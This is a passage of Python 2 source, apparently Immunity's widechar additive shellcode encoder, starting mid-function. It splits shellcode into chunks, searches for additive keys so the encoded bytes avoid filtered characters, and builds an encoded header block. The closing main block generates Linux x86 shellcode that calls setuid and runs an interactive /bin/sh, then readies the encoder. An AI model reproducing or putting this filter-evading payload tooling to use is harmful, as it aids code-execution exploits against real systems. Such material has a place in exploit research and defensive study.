                guess=uint32(-guess)
            failed=0
            self.setadd=guess
            #print "%d - Trying Guess: %8.8x"%(j,guess)
            newdata=self.encodedata(data)
            bad=self.find_bad_char(newdata)
            if bad==-1:
                #in words...
                newdatalen=len(newdata)/4
                #encoded entire buffer as this chunk!
                return (newdatalen,guess,newdata)
            
            if bad!=-1 and bad < self.minimumchunklength:
                failed=1
                if failed:
                    continue
            #newdata=self.encodedata(data,debug=1)

            #if we get here, we didn't encode the whole chunk, but we got enough of it to continue
            #we do this in words, rounded down
            newdatalen=(bad-bad%4)
            newdata=newdata[:newdatalen]
            #convert to words
            newdatalen=newdatalen/4
            return (newdatalen,guess,newdata)
                
        return (None,None,None)
    
    def findadditives(self,data):
        """
        finds the first two keys
        we use to encode the header block with
        """
        #print "len(data)=%d"%len(data)
        chunktuples=[]
        newdata=data
        newblocks=""
        while newdata!="":
            (size,key,encodedblock)=self.encodechunk(newdata)
            if key==None:
                print "FAILED TO ENCODE A CHUNK!"
                return (None,None,None)
            chunktuples.append((size,key))
            #print "new blocks size is %d"%size
            newdata=newdata[size*4:]
            newblocks+=encodedblock
        #each tuple is 8 bytes long plus 4 for the final zero word
        headerblocksize=len(chunktuples)*8+4
        #in words
        headerblocksize=headerblocksize/4 
        #we start the header block off with the size of the rest of the block
        headerblock=struct.pack("<L", headerblocksize)
        for tuple in chunktuples:
            print "Size of chunk is %d key is 0x%8.8x"%(tuple[0],uint32(tuple[1]))
            headerblock+=struct.pack("<L", tuple[0])+struct.pack("<L", tuple[1])

        #a zero size indicates the end
        headerblock+=struct.pack("<L", 0)
        print "Headerblock=%s"%prettyhexprint(headerblock)
        #then we encode the whole thing
        (size,key,block)=self.encodechunk(headerblock)
        print "Encoded Headerblock=%s"%prettyhexprint(block)
        if key==None:
            print "Could not encode header block!"
            return (None,None,None)
        alldata=block+newblocks
        (key1,key2)=self.splitadditives(key)
        
        return (key1,key2,alldata)
        
        
    def splitadditives(self,guess):
        j=uint32(0)
        failed=0
        #we'll look for 50000 words
        print "Encoder is Splitting: %8.8x"%uint32(guess)
        
        while j<150000:
            j+=1
            guess2=random.randint(0,sys.maxint-1)
            if random.randint(0,2)==1:
                guess2=uint32(-guess2)

            result=csub(guess,guess2)
            #print "J=%d"%j
            #print "Result="+str(result)+":%8.8x"%result
            #print "Quess2="+str(guess2)+":%8.8x"%guess2
            
            if self.has_bad_char(struct.pack("<L", result)+struct.pack("<L", guess2)):
                failed=1
                #print "Failed"
                continue
            else:
                failed=0
                #print "Found one!"
                break

        if failed:
            print "Failed to split guess: 0x%8.8x"%(uint32(guess))
            return (None, None)
        else:
            print "Split %x into %x:%x"%(uint32(guess),uint32(result),uint32(guess2))
            return (result,guess2)        
                
            
            
        
def usage():
    print """
    Widechar (Word) Add Encoder 1.0, Immunity, Inc.
    usage: widchar.py -f shellcode
    """
    sys.exit(2)


    
#this stuff happens.
if __name__ == '__main__':

    print "Running Add Encoder v 1.0"
    print "Copyright Dave Aitel"


    from shellcode import shellcodeGenerator
    myshellcode=shellcodeGenerator.linux_X86()
    #myshellcode.addAttr("Normalize Stack",[0])
    #myshellcode.addAttr("dup2",None)
    myshellcode.addAttr("setuid",None)
    #myshellcode.addAttr("debugme",None)
    myshellcode.addAttr("execve",{"argv": ["/bin/sh","-i"],"envp": [],"filename": "/bin/sh"})
    sc=myshellcode.get()

    app=widechar_chunkedaddencoder()    
    app.setbadstring(wcsupr_bad)
    print "Badchars: %s"%app.find_bad_char(binstring("1b554141"))
    #data=app.encode(sc)
    #print "Shellcode=%s"%hexprint(data)
    #import makeexe
    #makeexe.makelinuxexe(data,filename="a.out")
    #print "Wrote a.out"
